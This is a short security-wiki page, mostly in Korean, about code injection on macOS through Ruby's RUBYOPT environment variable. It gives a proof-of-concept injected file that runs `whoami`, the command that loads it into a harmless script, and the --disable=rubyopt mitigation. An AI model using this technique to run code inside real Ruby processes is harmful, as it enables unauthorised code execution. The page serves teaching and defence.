# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby는 script를 실행하기 전에 `RUBYOPT` environment variable에서 지원되는 command-line switch를 파싱합니다. Ruby는 `RUBYOPT`에서 `-e`를 통한 code execution을 거부하지만, `-I`는 library-search directory를 앞에 추가할 수 있고 `-r`은 library를 require할 수 있습니다. 따라서 attacker-controlled environment variables를 사용해 Ruby를 실행하는 process가 attacker-controlled Ruby code를 load하도록 만들 수 있습니다.<sup>[[1]](#references)</sup>

`/tmp/inject.rb`를 생성합니다:
```ruby:inject.rb
puts `whoami`
```
`hello.rb`와 같은 benign Ruby script를 생성합니다:
```ruby:hello.rb
puts 'Hello, World!'
```
제어된 `RUBYOPT` 값으로 실행합니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
이 동작을 비활성화하려면 스크립트 이름 **앞에** `--disable=rubyopt`(또는 `--disable-rubyopt`)를 전달합니다:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` 뒤에 작성된 옵션은 스크립트의 `ARGV`로 전달되며, Ruby가 이전에 `RUBYOPT`를 처리하는 것을 비활성화하지 않습니다.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
